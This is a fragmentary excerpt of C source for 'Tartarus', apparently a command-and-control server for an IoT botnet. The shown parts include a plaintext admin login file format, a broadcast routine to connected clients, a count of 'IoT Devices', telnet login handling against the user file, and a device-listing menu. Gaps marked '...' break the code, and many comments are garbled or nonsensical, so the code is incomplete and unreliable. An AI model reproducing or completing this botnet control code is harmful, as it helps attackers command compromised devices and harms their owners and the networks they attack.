...
the "arcues.txt" is our login file. should look like this: Vex root admin || Input: <Username> <Password> <Level> || levels="admin","normal","vip"
...
#define Tartarus_I_Substrate_Version "Tartarus v1"
#define Tartarus_I_Version_Number = "Tartarus"
//╚══════════════════════════════════════════════════════╝
//╔══════════════════════════════════════════════════════╗
...
void trim_removev2(char *target_string) // Void To Char String, Do Not Output To Original Function Caller
{
  ...
  for (trim_integer = start_integer; trim_integer <= finish_integer; trim_integer++) target_string[trim_integer - start_integer] = target_string[trim_integer]; // '' Value - (trim_integer = start_integer; trim_integer <= finish_integer; trim_integer++)
  target_string[trim_integer - start_integer] = '\0'; // Start String Of '' Value
}
...
void tartarus_broadcast(char *output_message, int var, char *message_vector) // Broadcast The Following On Administator [Screen]
{
        ...
        int trim_integer; // Output Statement Result Integers
        for(trim_integer = 0; trim_integer < max_file_descriptor_value; trim_integer++) // Set , With max_file_descriptor_value Value
        {
    ...
    for (trim_integer = 0; trim_integer < n; trim_integer++) // 'n' && 'trim_integer' comp
    {
      ...
      else if (listeninginterpretation == events[trim_integer].data.fd) // Listen FD - For Events.
      {
        ...
        for(ipIndex = 0; ipIndex < max_file_descriptor_value; ipIndex++) { // Create Index, IP
          ...
          clients[infd].transmitted_successfully = 1; // 'm Getting Tired Of This..
...
unsigned int tartarus_arm_connected() // Create An Unsigned Integer, For Our Device
{
        ...
        for(trim_integer = 0; trim_integer < max_file_descriptor_value; trim_integer++) // We Shall Set The File Descriptor Maximum For .
        {
  ...
  return total_output; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
    ...
    void *tartarus_title_creator(void *sock) // We Shall Create A Window Title For The Screen
    {
        ...
        while(1) // While == Wait 1 Second, This Is Stable
        {
            ...
            sprintf(string, "%c]0; Tartarus  [BETA] | IoT Devices: %d | Administrators: %d %c", '\033', tartarus_clients_connected(), successful_transmission, '\007'); // [Title]
...
void *tartarus_telnet_data(void *sock) { // Here Is Where The Magic Happens 
  ...
  FILE *fp; // Check
  int trim_integer = 0; // Create Integer For 
  ...
  find_line = tartarus_file_searcher_v3(write_string); // We Search The User File
    ...
    failed:
      ...
      sprintf(bot_2,    "\e[38;5;201m║ \e[38;5;202mTartarus  \e[38;5;201m- \e[38;5;202mDevice Listing \e[38;5;201m- \e[38;5;202mArch Detection \e[38;5;201m║\r\n"); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
...
int main (int argc, char *argv[], void *sock) // Set Integers For Arguements - Then Char For Output Communication
{
        ...
        if (bindinginterpreter == -1) // Check If  Wanna Die Again..
        {
        ...
        if (s == -1) // Check If  Wanna Die Again..
        {
